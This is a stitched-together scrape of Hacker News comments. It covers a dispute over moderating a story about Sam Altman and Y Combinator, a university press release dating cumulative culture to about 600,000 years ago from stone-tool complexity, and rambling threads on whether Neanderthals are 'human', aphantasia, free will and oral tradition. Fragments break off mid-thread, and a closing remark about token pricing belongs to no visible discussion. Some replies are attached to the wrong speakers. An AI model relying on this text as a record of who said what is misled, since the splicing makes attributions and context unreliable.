didn't have time) was the responsive, interactive moderation piece. It's important to understand that this is not a technical solution (like a moderation log would be). The thing that makes things work better is human interaction, there's no substitute for that, and we're already doing a lot of it. reply CobrastanJorji 16 hours agorootparentprevYeah, as much as the transparency is very much appreciated here, \"yes, a mod totally did try to subtly bury this story exactly as you predicted and despite our official mod policies\" sounds pretty bad, even if you undid it. Some visible \"[Moderator Downvoting]\" warning would help earn trust that mods are not in fact doing this to YC-related stories. reply dang 1 hour agorootparentI checked with the mod and they weren't trying to bury the story but rather to downweight it less than we normally would, in keeping with the #1 rule I described upthread (https://news.ycombinator.com/item?id=40712900). The intention was to downweight it enough that it wouldn't be near the top of the front page but not so much that it would leave the front page. That's the same thing I would have done, btw. It looks like what happened was that more user flags came in and that, together with the moderation downweight, moved the story off the front page. Eventually we noticed this and restored it to the lower part of the front page, which is the standard practice for stories of this kind, which we'd never allow to be on HN's front page if they were about anybody else. (Though, as someone pointed out to me, this story wasn't negative about YC.) reply twoodfin 17 hours agorootparentprevI dunno if it’s outrage-worthy, but the silent evolution of the YC blog post on Sam’s departure was weird, and nobody involved—particularly pg in his recent comments meant to be definitive—has managed to explain why that went down the way it did. https://news.ycombinator.com/item?id=38384090 reply cynicalkane 16 hours agorootparentIt's worth noting that `dang` is one of the people who noted the evolution happening. reply CRConrad 5 hours agorootparentprev> This looks like a flimsy story from a couple of months ago about something from many years ago. \"Here's me obediently following the rule (Oh, the world is so full of silly rules!), but let me editorialise a bit on why any story about how Sam Altman isn't the greatest thing since sliced bread should be disregarded...\" And you don't see how that undermines any \"trust we have with the bulk of the community\"? reply dang 24 minutes agorootparentI don't, because it doesn't. If the bulk of the community distrusted us, that would be by far the dominant issue on HN. That's how internet dynamics work. The reason I post such long explanations when a case like this comes up is not because I think it will satisfy the disgruntled, chronically distrustful sliver of users (though that would be nice!) but because I know that patiently explaining everything that happened, and why, is enough to reassure the bulk of the community. (I wrote a bit more about this here if anyone cares: https://news.ycombinator.com/item?id=40720410) reply eduction 17 hours agorootparentprev> It's hard to tell if there's any there-there but, given how this sort of story usually works, the odds seem low. Not at all. The source links the relevant SEC filing. https://www.sec.gov/Archives/edgar/data/1849056/000110465921... On page 111 the false claim is plainly visible: “ Prior to joining OpenAI, Mr. Altman served as President of Y Combinator from February 2014 until March 2019. Mr. Altman currently serves as the Chairman of the board of directors of Y Combinator.” There is also a screenshot in the Business Times story showing the false claim was visible on the AltC website in April. You can go to the AltC site and confirm that Sam is CEO. The story also includes comment from YC confirming that Sam was never chairman after it was announced he would be. Dang, what is the basis for your comments on this story? The San Francisco Business Times has been a reliable and fairly pro business local source for years. Hardly tabloid journalism. Can you specify and explain one of the “false claims” you allege? reply tensility 17 hours agorootparentCrisis of trust in Altman reflects back on Y Combinator.

That wasn't just completely made up, it's the exact opposite of the truth. My comment originally included that explicitly, but I was trying to edit it down a bit and thought this would be clear from the context. Since it wasn't, I've added an edit there now. reply mlyle 17 hours agorootparent> it's the exact opposite of the truth. One can hardly call it the exact opposite of the truth if the feared downweighting of this post actually happened. It's commendable that it was corrected and that you are attempting to be transparent. But, it sure creates the appearance of a self-protective attempt to moderate. reply dang 17 hours agorootparentYes, I take your point and would have preferred the original downweight to be less for that reason. (Edit: I checked with the mod and originally it was - see https://news.ycombinator.com/item?id=40720026. It looks like user flags made the difference.) Different mods inevitably make different calls sometimes, though. That doesn't change the fundamental practice, which has been stable for a long time (long before I took over HN long ago). One thing I often point out in these situations is that \"moderate less\" (which is what the rule calls for) is not the same thing as \"not moderating at all\". Most probably the mod in this case was thinking along the lines of \"I'm still moderating less in this case than we normally would, but I'll check with dang just in case\". reply eduction 17 hours agorootparentprevYou called the story “flimsy.” How so? reply lnyan 17 hours agoparentprevThe post was moderated within 10 minutes of being submitted: https://news.social-protocols.org/stats?id=40710417 reply dang 36 minutes agorootparentThose were user flags.

By Julie RussJune 17, 2024 Each of us individually is the accumulated product of thousands of generations that have come before us in an unbroken line. Our culture and technology today are also the result of thousands of years of accumulated and remixed cultural knowledge. But when did our earliest ancestors begin to make connections and start to build on the knowledge of others, setting us apart from other primates? Cumulative culture — the accumulation of technological modifications and improvements over generations — allowed humans to adapt to a diversity of environments and challenges. But, it is unclear when cumulative culture first developed during hominin evolution. A study published this week in the Proceedings of the National Academy of Sciences journal by Arizona State University researcher Charles Perreault and doctoral graduate Jonathan Paige concludes that humans began to rapidly accumulate technological knowledge through social learning around 600,000 years ago. “Our species, Homo sapiens, has been successful at adapting to ecological conditions — from tropical forests to arctic tundra — that require different kinds of problems to be solved,\" said Perreault, a research scientist with the Institute of Human Origins and an associate professor with the School of Human Evolution and Social Change. “Cumulative culture is key because it allows human populations to build on and recombine the solutions of prior generations and to develop new complex solutions to problems very quickly. \"The result is, our cultures — from technological problems and solutions to how we organize our institutions — are too complex for individuals to invent on their own.” To investigate when this technological turn may have begun and to explore the origin of cumulative culture, Paige and Perreault analyzed changes in the complexity of stone tool manufacturing techniques across the past 3.3 million years of the archaeological record. As a baseline for the complexity of stone tool technologies achievable without cumulative culture, the researchers analyzed technologies used by nonhuman primates — like chimpanzees — and stone tool manufacturing experiments involving inexperienced human flintknappers and randomized flaking. The researchers broke down the complexity of the stone tool technologies by the number of steps (procedural units, or PUs) that each tool-making sequence involved. The results suggested that from around 3.3 to 1.8 million years ago — when australopiths and earliest Homo species were around — stone tool manufacturing sequences remained within the range of the baselines (1 to 6 PUs). From around 1.8 million to 600,000 years ago, manufacturing sequences began to overlap with and slightly exceed the complexity baseline (4 to 7 PUs). But, after around 600,000 years ago, the complexity of manufacturing sequences rapidly increased (5 to 18 PUs). “By 600,000 years ago or so, hominin populations started relying on unusually complex technologies, and we only see rapid increases in complexity after that time as well. Both of those findings match what we expect to see among hominins who rely on cumulative culture,” said Paige, a postdoctoral researcher at the University of Missouri and an ASU PhD graduate. Tool-assisted foraging may have been the impetus for the earliest beginning of the evolution of cumulative culture. Early hominins, 3.4 to 2 million years ago, likely relied on foraging strategies that require tools — like accessing meat, marrow and organs — leading to changes in brain size, lifespan and biology that set the stage for cumulative culture. While other forms of social learning may have influenced tool-making, it is only in the Middle Pleistocene when there is evidence for rapid increases in technological complexity and the development of other kinds of new technologies. The Middle Pleistocene also shows consistent evidence of controlled use of fire, hearths and domestic spaces, likely essential components of the development of cumulative culture. Other kinds of complex technologies also developed in the Middle Pleistocene, including wooden structures constructed with logs hewn using hafted tools, which are stone blades affixed to wooden or bone handles. This all suggests that cumulative culture arose near the beginning of the Middle Pleistocene epoch, possibly predating the divergence of Neanderthals and modern humans. Published article: 3.3 million years of stone tool complexity suggests cumulative culture began during the Middle Pleistocene. Jonathan Paige and Charles Perrealt.

Stone tools remained essentially unchanged for a long, long time. 600kya would have been within the range where there were still multiple homo species occupying very similar regions. An important thing to remember is that the homo family tree is more like a bush than a tree, with lines getting very blurry and a lot of interbreeding. It makes me wonder how much technology like this actually came from our precise lineage or was shared/stolen/learned amongst human species. reply cpncrunch 14 hours agoprevNews article says humans, but earliest human (homo sapiens) was around 300kya. The actual paper uses the word hominids rather than humans. reply AlotOfReading 11 hours agoparentThe word human is commonly used for both modern humans and members of the entire genus Homo. Hominids is a more general superset that isn't strictly correct here. The term hominin is more appropriate in this context and what they actually use in the abstract. In my opinion though, \"human\" is the better word here for conveying the right mix of informality without implying the specific semantics of \"Hominini sans Pan\". reply MattPalmer1086 11 hours agorootparentIs it? This is literally the first time Ive seen the word human applied to other hominids. I see many discussions about neanderthals and denisovians and so on. I have never seen them referred to as human. reply darby_nine 8 hours agorootparentI'll admit this is the first I've encountered the concept that \"neanderthals and denisovians and so on\" are not human.

I was sufficiently surprised to hear that humans were around 600k years ago that I came here to comment. The Wikipedia article [1] on humans makes the same point. It does acknowledge that some use the term human to refer to all members of the genus homo, but this is not the common usage. [1] https://en.m.wikipedia.org/wiki/Human reply lkrubner 11 hours agorootparentprevI'm not sure where you are reading but both layman and scientists commonly use the word \"human\" to refer to the genus \"homo\".

Where is this coming from? Is it a non-English world thing? Generally Neanderthals are pointed out as an exception to cross species fertility since... humans have some Neanderthal DNA. reply jb1991 7 hours agorootparentWherever it’s coming from, it’s not based on any particular language. Museums in English-speaking countries use the term. reply Amezarak 6 hours agorootparentprev> Generally Neanderthals are pointed out as an exception to cross species fertility since... There's no such rule and Neanderthals are not notable as an exception. Fertility is just a very rough proxy for genetic distance, which is correlated to our arbitrary \"species\" buckets but by no means a real line or hard rule. Many, many reasonably closely related species can interbreed, like jaguars and lions. Most of homo that had the opportunity could probably interbreed. reply graemep 11 hours agorootparentprevIt is also reasonable to argue that they and we are subspecies of the same species not rather than separate species. reply acchow 9 hours agorootparentOf course we are not separate species since successful interbreeding did happen (when the populations interacted). reply jb1991 7 hours agorootparentDonkeys and horses are not the same species, but they interbreed. Their offspring are called mules. Although mules rarely have offspring, so perhaps not a great example. reply Turskarama 6 hours agorootparentThere is supposedly neanderthal DNA in some modern humans, implying that offspring were viable. Breeding resulting in viable offspring is one of the only consistent definitions of what a species even is. reply Amezarak 6 hours agorootparentWe could make that the definition, but we'd doing a lot of redefinition: coyotes and wolves would become the same species, as would lions and jaguars. Fertility issues tend to increase with genetic distance but aren't guaranteed; for example, mules are usually but not always sterile. reply BurningFrog 4 hours agorootparentprevIf you look closely at it, the concept of \"species\" is impossible to define exactly. That's fine in general. Many words are like that. But it makes it flawed as a scientific concept. reply Amezarak 6 hours agorootparentprevThat's not the definition of species. Many species can interbreed, sometimes even species that are pretty distantly related. reply seszett 10 hours agorootparentprev> I have never seen them referred to as human. I have never seen anything else. But then in French, they are called Neandertal men and Denisova men. So pretty clearly humans. reply Y_Y 9 hours agorootparentI think it's typical in non-technical English to use \"humans\" to refer to homo sapiens only, unless you qualify it, like \"archaic/early humans\". Without additional context I wouldn't assume somebody talking about humans meant to include e.g. Neanderthals. reply skywhopper 7 hours agorootparentQualifications like, “600k years ago”? That’s pretty clearly talking about the humans of 600k years ago. “Early humans” are still humans. reply Y_Y 5 hours agorootparent> “Early humans” are still humans. I respectfully disagree, as started in my earlier post. It would be nice if human language worked like that, but it does not always. A \"stone frigate\" isn't a boat, an \"iron lung\" isn't a respiratory organ. reply goatlover 5 hours agorootparentThose things aren't closely related biologically, so not a good analogy. \"Human\" isn't a precise biological category, it's just based on how the word is used, unlike homo sapiens. And some people, including scientists, use it to mean closely related species of hominids. Or hominids generally. reply Y_Y 5 hours agorootparentI agree? I didn't know close biological relation was a prerequisite for a good analogy, but I'll gladly oblige: vampire squid, velvet ant, slipper lobster, naked ape. reply tshaddox 5 hours agorootparentprevUsage is definitely mixed, but I’m surprised you haven’t encountered this. From Wikipedia: > Although some scientists equate the term \"humans\" with all members of the genus Homo, in common usage it generally refers to Homo sapiens, the only extant member. All other members of the genus Homo, which are now extinct, are known as archaic humans, and the term \"modern human\" is used to distinguish Homo sapiens from archaic humans. reply BurningFrog 4 hours agorootparentprevBeing 2.3% neanderthal, I'm... not sure what to think about it. I think it's a case of the classic issue of trying to make sharp boundaries in a continuum. There just are no fully satisfying answers. reply Stratoscope 9 hours agorootparentprevWait a minute. I am part Neanderthal. Does this mean I am only part human? reply card_zero 8 hours agorootparentYou're also part bacterium and part treeshrew, so I couldn't really say for sure. reply Aardwolf 4 hours agorootparentprevIf 500,000 years ago a hominid sits by the fire they lit and is working on sharpening a stone tool, would you say: \"someone / a person is sharpening a tool\" or \"it / a hominid is sharpening a tool\"? reply Dgrin 3 hours agorootparentI personally would call them a human, but this seems like a false equivalence unless you believe that personhood is something exclusive to humans. “Someone / a hominid” is perfectly valid and could at the same time be “someone / a person”. reply AlotOfReading 11 hours agorootparentprevI can't speak to what you have or haven't seen before, but yes it's quite common as informal language among anthropologists with particular kinds of views. Sometimes people will use \"modern humans\" or \"archaic humans\" or some other variation to differentiate, but not always and it's usually pretty clear from context regardless. This is just one of many examples of definitions being extremely unstandardized in human evolution. You get used to it after awhile. reply skywhopper 7 hours agorootparentprevUh, I guess you aren’t reading the same things I am. Neanderthals were definitely “human”. reply butlike 3 hours agorootparentprevHuman === Homo sapien _sapien_. Homo Sapiens are a different thing reply AlotOfReading 3 hours agorootparentH. s. sapiens is not universally accepted either. As a practical matter, it'd raise a lot more eyebrows in an actual conversation with anthropologists than the informal usage of humans = genus Homo I mention above. reply sydbarrett74 13 hours agoparentprevCan we all agree that 'human' should be defined as all members of the genus Homo? reply eru 11 hours agorootparentI would be fairly happy with that definition, but I wouldn't rely on it out-of-context. (I would definitely call Neanderthals \"human\" in almost any context.) reply ljf 6 hours agorootparentAccording to 23andme I am 2 to 4% neanderthal, and I think of myself as human... reply bloak 5 hours agorootparentprevA single-word common name usually refers to a genus: \"oak\" is anything in Quercus, \"wagtail\" is anything in Motacilla and so on. That's not conclusive because there are plenty of exceptions, and \"human\" could easily qualify as a special case, but I don't see why \"human\" shouldn't be any member of Homo. reply Pengtuzi 13 hours agorootparentprevNo reply alberto_ol 13 hours agorootparentArchaic human? https://en.wikipedia.org/wiki/Archaic_humans reply johnnylambada 16 hours agoprevIt’s fascinating to think about the number of PUs (procedural units) it takes to make a modern tool.

Language evolved to improve the fidelity of imitation much like how genes evolved pathways to minimize random mutations during copying. Once imitation gets good enough (general and accurate) were capable of spreading behaviors (phenotypes) without having to wait for folks to be born and grow up. reply Earw0rm 13 hours agorootparentThat's culture, and it's known to exist among animals in a limited way. We don't really know what the upper bound for non humans is, because we don't know exactly what's being communicated by, for example, whale song. reply Vespasian 12 hours agorootparentI wonder whether we (as human) are merely the first species that managed to overcome initial barriers to developing culture and tech and thereby preventing any other species to do the same (for now). It feels like bipedalism, opposable thumbs and strong social behaviour and other factores were the perfect storm at the perfect time. reply maxwell 4 hours agorootparentChickens are bipedal. There are tree frogs with opposable thumbs. Elephants and cetaceans have strong social behavior. Other hominids have all these. What other animals make fire?

From a calories-per-unit-of-labor standpoint, dogs and cats have now clearly eclipsed humanity, using their emotional intelligence to create a post-scarcity Marxian utopia where they can mostly do whatever they want all day while humans toil for them. reply mrguyorama 13 minutes agorootparentprevI don't think fire and therefore cooked food was THE change, though I think it definitely helped, but >If most animals are operating on a calorie deficit and fixing this can lead to larger brains then why haven’t domesticated animals evolved towards our level of intelligence? Because farm animals do not evolve, they are bred. We have directed their evolutionary paths for centuries, away from what it would do on it's own, towards creatures that produce more milk, more meat, or fattier meat. reply calepayson 4 hours agorootparentprevThere’s a professor at St. Andrew’s, Kevin Lalland I think, who has done a lot of work on imitation. His theory is that that imitation is generally useful but without high enough copying fidelity culture won’t develop. For example monkeys have been known to exhibit fashion trends (hanging a bit of grass out of their ear). But these trends fizzle out over time. Before more behaviors can be layered on top. I think you’re right about those factors creating a good environment for this to happen and I bet they’re sufficient but not necessary. Too bad we don’t have another example :) reply Earw0rm 10 hours agorootparentprevOther species have culture (behavioural traits/patterns and social organisation/cues that are communicated, not innately inherited via genes and development), and other species have tech (making intentional modifications to their environment, creating structures that better support their existence). What seems to be rare is the ability to use culture a medium to store and transmit tech. reply lordnacho 6 hours agorootparentIt's that Noah Yuval Harari book, isn't it? What's separates humans is we can construct common fictions that we actually believe in, eg \"my job is to maximize shareholder value\" where both the corporation and the responsibilities towards it are made up but generally believed. There's of course a rather large elephant in this room, too, that decides a lot of things about our lives. reply calepayson 3 hours agorootparentHarari’s book is awesome but I think he gets stuck too far up the hierarchy. Trying to describe culture with stories feels like trying to describe biology with proteins. It gets us most of the way there but also adds a whole ton of complexity because it misses the fundamental nature of the system. Humans are great at general and accurate imitation. This probably seeded a runaway evolutionary process, the result of which was tools, fire, and language. reply guide42 8 hours agorootparentprevThis is what the book Ishmael by Daniel Quinn proposes. Interesting read. reply exe34 10 hours agorootparentprevthe same thing probably happened early on, chemical evolution may have thrown up multiple replicators, but our ancestors had some small edge which allowed them to literally eat the competition. reply Cthulhu_ 5 hours agoparentprevIt doesn't even have to be verbal, but through showing; many animals teach each other using that, and that goes back much further than 300K years ago. But there must've been a change in early humans that made it more effective, make it go beyond basic skills. The other thing to consider is that they reached a point where they could gather food / survive more easily. If less time needs to be spent getting food - because they've reached a level of intelligence where they can, for example, store food for longer, or prepare / cook it for more efficient calorie gathering, or grow food, or share food / acquire more than an individual needs, etc - then there's more time left for cultural exchange, experimentation and play. That is, spend more time experimenting with a stone tool to make it better beyond the base necessity. disclaimer: I have no idea what I'm talking about. I don't actually believe early humans spent that much time surviving, looking at apes they seem to spend a lot of time just sitting around. reply perlgeek 4 hours agoparentprevI've read a lot of hypotheses about what could have happened.

We already know deaf children will invent signs and gestures to communicate, and language not dependent on a hyoid bone. Do we have any way of dating the relevant neural structures through genetics? reply davidmnoll 6 hours agorootparentI think we’d have trouble because we’d have to tie the gene to a specific linguistic cognitive function.

Language certainly helps shape thoughts, even to the extent that, certainly for older kids and adults, different languages influence and constrain thought in different ways. But consider dreams. These are adjacent to thoughts, and don't require language. Some dreamers are even able to express will not only on their actions, but over the dream itself.

Thinking is pretty clearly determined by exterior stimulus just like feeling is. reply goatlover 5 hours agorootparentHow would thinking be determined by exterior stimulus, when we all vary to some extent to the same stimulus? Behaviorism was found wanting because it didn't account properly for goes on between the ears. And the rest of the body, which makes us individuals. The idea of free will comes from the fact that people do make different choices. We make different choices than our past selves did. From a compatibilist perspective, one could say free will comes from being part of determining what goes on. Things don't just happen to us. We participate in what does happen. We're not simply puppets on the string of the external world. We're just as much a part of causing things as everything else is. reply MeImCounting 2 hours agorootparent> How would thinking be determined by exterior stimulus, when we all vary to some extent to the same stimulus? Because, and this may shock you: we are not all the same person You make an excellent point that people respond differently to a given stimulus. This is explained by those people having had different genetics, environments, upbringings and even breakfasts leading up to the point of the test. It has been demonstrated that your metabolic state will vastly change your response to stimuli throughout a day. I ate something different for breakfast today than yesterday because one sounded tastier than the other. I made this decision not because I have an eternal soul making randomized decisions like a roulette machine but because yesterday I craved salty food and today yogurt sounded better. I am different person today than I was yesterday. My gut, brain and everything else has been changed by all the stimulus I experienced yesterday and is now influencing my responses today. reply mistermann 14 hours agorootparentprevWhere does \"clearly\" originate, and what does it refer to? Is \"just\" a synonym for \"exactly\" in this context? reply MeImCounting 12 hours agorootparent\"Clearly\" refers to the obviousness or self-evidence of the statement. In this context, \"just\" means \"similarly\" or \"in the same way,\" or ig \"exactly\" if you like. \"Clearly\" because exterior stimuli clearly influence both thinking and feeling, a concept supported by common experience and scientific understanding of human cognition and emotions. reply mistermann 5 hours agorootparentHow are all of these measured? reply MeImCounting 2 hours agorootparentTheres actually a ton of different ways. The most obvious is probably MRIs of which many have been conducted with the subject having a huge variety of different stimulus. Then theres the good old fashioned behavioral studies ranging from the classic \"does the subject jerk their hand back in the presence of heat?\" to the more recent hungry judge phenomenon. I wouldnt think the fairly self evident assertion that exterior stimulus changes both the internal state of a person as well as their behavior would be controversial. At this point in history \"free will\" is really just the god of the gaps and those gaps shrink every year. Its probably a useful religious concept but as far as reality goes its the least interesting question one could ask about the whole human experience. reply mistermann 34 minutes agorootparentDid you remember to check/contemplate whether your \"measurements\" are correct?

Also theres much more interesting questions to be asking. reply mistermann 31 minutes agorootparentMight \"explanations\" have a (perhaps private, or semi-private) epistemic value attribute?

I can understand some difficulty in a perfect image, but nothing? reply trescenzi 15 hours agorootparentThe fun thing is that for those of us who cannot it’s as hard to believe others can conjure images. Yes the idea of mental imagery is deeply ingrained in our language but I’d always assumed it was allusion till I learned of aphantasia when I was 30. One of the more cliche, and not super useful tests, is “imagine a ball on a table, someone pushes the ball and it begins to roll. What color is the ball?” For me that was a revelatory statement because I’d never consider that others might give the ball a color, or size, or texture as the imagine it. I assume not everyone with the ability to visualize does but it seems like many do according to the literature. To me it’s just a statement, a ball is rolling pushed by a nondescript person. reply p51-remorse 14 hours agorootparentSo for me I definitely visualized a ball on a table, but the color wasn’t resolved, if that makes sense. After hearing the question asked it kind of snaps out of superposition into a red color (but there was definitely a color-choosing step that happened after hearing the question). Same thing happens if you ask “what surface is the table on” or “what country is this image in”. It’s layers I can add to the mental state, but if they’re not important they’re just not there. I’d say the closest thing to what I was “seeing” before the color question is something like a wireframe, or maybe the gray color of a Blender model without colors/textures applied. Grey in the sense that you don’t really notice it’s grey, you just understand the grey color means color is absent. reply dTal 10 hours agorootparentYou described my experience well as well, except my abstract colorless ball was barely even visual. I was quite happy to entertain the idea of a ball on a table with very few concepts activated - roundness for the ball, flatness for the table, gravity holding the ball on the table. Rather like a physics problem. When forced to dereference a color, it felt like an entire system was booted up. Not only did the ball have color, it also had specular reflections. There was lighting. The table gained an abstract sense of having texture. What I find particularly fascinating is that my mind also assigned \"red\". I wonder if that is a coincidence, or a deep reflection of something about how brains work. Supporting evidence: in languages with only three words for color, the three colors are \"light\", \"dark\", and \"red\": https://en.wikipedia.org/wiki/Color_term#Stage_II_(red) reply r2_pilot 6 hours agorootparentI'll also chime in and say I was able to visualize the generic ball-ness and as soon as the question of color arose, I also immediately picked red despite not being my favorite color or anything. I blame childhood depictions of balls lol reply sethammons 6 hours agorootparentprevI imagined a small, red, dense foam ball actively being placed by a feminine hand with matching red nails and a fancy bracelet onto a white marble slab with olive green marbling. The slab is a couple inches thick and overhangs the cabinets below it. The point of view, like watching from my own eyes, is looking down at the counter with the ball being placed by the ephemeral hand as if they stood opposite me. What color was the ball? I didn't have to think; I knew it was red. However, I can't tell you much about the cabinets or the arm or body attached to the hand.

Makes me think about people complaining of having unwelcome images brought to mind. Which I can relate to through songs.

Basically, everything in my mind is in a compressed symbolic state. The most notable difference is if you ask me to imagine something, there isn’t any detail in the “image” that I haven’t intentionally placed there. “Imagine the face of a stranger you haven’t met before; what color are their eyes?” Idk, I can add eye color to the image, but I certainly can’t just observe it, because both before and after it’s just the concept, not like a picture I can just look at. reply sethammons 6 hours agorootparentFor me, it is a picture to look at. Like a bust, I had a head and shoulders to look at. The stranger's eyes were deep brown; practically black. They were half asian half white, had black hair, palish white skin, dark eyes, a flat near-smirk. He was wearing a blue collared button up shirt with a mild jeans like texture. The sleeves were rolled up. The buttons were white. reply Earw0rm 12 hours agorootparentprevSame, at least 90% or so.

But I think I might be synthesizing \"brain stage 2\" when I imagine seeing e.g. a red apple in a pretty similar way to actually seeing it - I can feel \"red apple vibes\" but there is no image of a red apple my field of view. My brain state certainly contains some data about the color of the imaginary apple and the shape of it, but it's not nearly the same as actually seeing it. This is all astonishingly hard to explain in a way that communicates accurately between two people though. reply tonynator 14 hours agorootparentAbsolutely same. I wonder how much of it is most people being like this and many of those saying \"well yes of course I see the apple\" without really thinking about it. If someone actually sees the apple, v.s. imagining what it would be like if they were seeing it, they're hallucinating. Not that it wouldn't be cool to be able to do that on command, I just wonder how many people really can. reply mkl 9 hours agorootparentI really see it. It's not hallucinating as the imagined image is not in the real world. It's like a different input to the visual processing part of my brain (but both inputs work at once, a bit like looking at a different thing with each eye).

It's an idea that falls apart on close inspection. You think \"I will wash the dishes\". You wash the dishes. Ta-daa, free will! A paralyzed person thinks \"I will raise my hand\". Nothing happens. No free will! An ADHD person says to themself \"I will wash the dishes\". They don't get washed. A different part is broken than to the paralyzed person, but the result is the same. A lazy person says to their roommate \"I refuse to wash the dishes\". Free will? They \"could\", if they were not lazy. Just as the ADHD person \"could\" if they did not have executive dysfunction. Just as the paralyzed person \"could\" if their spinal cord were intact. \"Free will\", as a philosophical construct, is nothing more than an attempt by the ego to regain a sense of control in the face of the irrefutable realization that the universe is governed by rigid laws, and we are made of universe. (And no, quantum randomness doesn't help you - a random choice is hardly more of an extension of will than a deterministic one). reply vasco 9 hours agorootparentI agree with the only caveat that the universe should have a maximum amount of precision it uses to calculate every next frame, and at the margin of error of these calculations, non-determinism may arise. reply dTal 9 hours agorootparentEven if those assumptions were true (and why should they be? the universe is not a computer, does not have \"frames\") what would that have to do with \"free will\"? reply vasco 8 hours agorootparentWhy should yours? It seemed like you liked musing about this topic so I added a bit. You (and I) have no idea if the universe is or not a computer. If you don't see the connection of free will to error margin of a deterministic system then I'm not sure how else to put it.

Did the program choose to be broken by a cosmic ray? Did the cosmic ray choose to break the program? Stochasticty doesn't imply volition. reply vasco 8 hours agorootparentIt's the only way I've come up with that allows for free will, maybe other people have other ways. If the universe is not like a computer then I have even less ability to explain where free will would be possible. Cosmic rays are just an example to explain that there's external causes of non-determinism to a deterministic system. Another example I gave above was the limit of precision of the system itself, allowing for \"free will\" (meaning something which isn't perfectly explainable by just the laws+starting conditions). To me it's obvious the universe is deterministic, but the fun part is imagining ways in which it might not be. Comparing the universe to a computer is a fun way to think about it. reply vasco 5 hours agorootparentWe're too deep so I can't reply anymore, but I didn't say this was an explanation for it, more like a possible requirement for it. There may be other ways in which free will would be possible. Remember, I said already multiple times I start from the premise there is none, but it's fun to take the other side and try to come up with possibilities. I think you're too boring if you just take a position and never try to defeat it in your mind! reply dTal 6 hours agorootparentprev10 print \"If the universe is non-deterministic, that provides an explanation for free will!\" 20 print \"How? Coin flips don't have free will...\" 30 goto 10 reply bad_user 7 hours agorootparentprevThe samples you gave make no sense. Firstly, a person suffering from ADHD can do the dishes, despite the odds being against them. And a paralyzed person can raise their hand, given advances in technology. And these are bad examples, as being incapacitated isn't an argument against free-will. The paralyzed still wants to raise their hand, even if they are unable at the moment. And the far more difficult question is if that want was entirely predetermined by the universe or not. Quantum randomness and the huge number of variables at play point to the fact that believing that we don't have free-will is a non-falsifiable notion. Consider this thought experiment: God comes to you and says ... \"Here are 2 universes you can observe, one in which people have free-will, and another, that looks similar, but its people are just sophisticated automatons. Make an experiment to say which is which.\" Your irrefutable argument quickly falls apart because there's no way you can show any relevant evidence for it. And it's worse than talking about the absence of God, because we experience free-will everyday. It's like talking of consciousness — we can't define it yet, but we know it's real, as we're thinking and talking about it. And a theory being non-falsifiable does not make it false. God could exist and you could have a soul. You may or may not believe in free-will. But not believing in free-will is dangerous because it makes one believe that everything is predestined, so there's no point to doing anything, no point in struggling to achieve anything, no point in trying to escape your condition. If no free-will is possible, does life have any value at all? And that's the actual philosophical bullshit. reply rightbyte 12 hours agorootparentprevI don't see the connection.

YMMV of course. reply dotnet00 14 hours agorootparentThis describes my experience nicely too, although I didn't quite realize it until reading this. I was thinking I just thought in words and had a tendency to mix up the bits of various languages I know some words from, but occasionally I have some thought, then for one reason or another become conscious of the thought and get confused which language I was thinking in. Sometimes this even manifests as trying to mix languages (eg at one point I used to struggle to not sprinkle in french and farsi words into normal english, despite speaking english at a native level and only knowing the basics of the other two). I've always thought of my mental model as an endless conversation with myself, but I think the more fitting description would be a \"smooth\" series of thoughts which only materialize into language when I explicitly focus on those thoughts as their own thing. I do also think visually for things that have a visual component though. reply Zambyte 16 hours agorootparentprevDo you find your domain of thought shifts when you do not think with language?

People can think in words, but it's certainly not their only way of thinking. I think the thinking in words is kind of like \"thinking on paper\" where you're trying to explicitly reason through something. The thinking process itself seems to be something on a deeper level. reply bbwbsb 16 hours agorootparentprevThe crux is the word 'I'. When I say 'I' think, do I mean the conscious part of me which has direct experience of that thinking? If so, then I am denying all the of the thinking that 'I' don't do, but my brain/body does. From that perspective, the experience of thinking in words or pictures is distinct from actually thinking in words or pictures. Saying one thinks in one of these ways seems to be saying what they identify thinking with. For example, I don't usually think of fantasy as thinking. If I day dream, I wouldn't say I am thinking, but that is fairly visual. To what degree am I saying something about myself vs my identity if I say I do or don't think in words given that context? Relatedly, I've noticed that when it comes to remembering something, it is not 'I' that remember. Rather 'I' set up mental cues and direct focus, which then hopefully causes the memory to be placed within my awareness. This happens below the level of direct experience. But I might say I failed to remember, taking responsibility for something that 'I' - the part separated from the automatic functions of the body - did not do. So I'm suggesting statements about words vs pictures are about ego, metaphor and meaning-building, and not about actual mechanisms or communicating actual differences in the experience of thinking. It can be difficult to talk about these things because such conversations implicitly occur between our identities, not between who we actually are - something beyond our grasp - and the noise this introduces is something I don't know how to surmount, or if it can be surmounted. reply thaumasiotes 13 hours agorootparentprevNo, you don't think in words.

Rulers, religions, and pop culture can and does choose to selectively remember history. In recent years people even take delight in being uninformed about various topics.

Nope. You can pass on myths the same way. All that happens is that you get more refined myths, that always have \"evidence\" for them at any point in time because they are refined by each generation to fit any new observations. It's worse with oral knowledge[1]: oral \"knowledge\" that is passed down is frequently more damaging than not passing anything down at all, because in the lack of any knowledge on the subject, people will try to gain some knowledge (whether experimentally or not), but with \"knowledge\" passed down, there will exist pockets of people who will actively resist any attempt to discard that \"knowledge\".[2] [1] Ever play a game of telephone?

I doubt it - which one is the \"correct\" message is going to be up to chance, not up to a network effect. Even if you take the optimistic approach and only retain that knowledge that is common to all branches, there is a vanishingly small chance that the correct knowledge would be retained, because the errors in transmission are not going to be completely random - the sort of error one oral storyteller introduces is going to be similar to the errors introduced by other storytellers.[1] It's why the history of tribes who did not write things down is treated as myths: the myth-makers are likely to weave whatever current affairs into existing mythology to \"explain\" new observations, in the process discarding what was there in the first place. When the record is written down, at least we can read what was thought at the time of writing. [1] Completely made-up example: Original story -> Crocodile dragged off tribes best warrior. Probable error after gen-10 -> Crocodile is double the original size. Probable error after gen-20 -> Longer than a man. Probable error after gen-30 -> Taller than a man.

Cost-per-quantity (L/100km) is easier to compare than quantity-per-cost (MPG) because how much you use isn't going to change based on the model. Which is to say, if two local models are both $0.00 per million tokens, they effectively have the same cost. You could argue that you might get better results by throwing out more tokens, but the solution is to add more significant digits to the price per unit. reply andenacitelli 15 hours agorootparentprevYes, but it’s true in the general case.

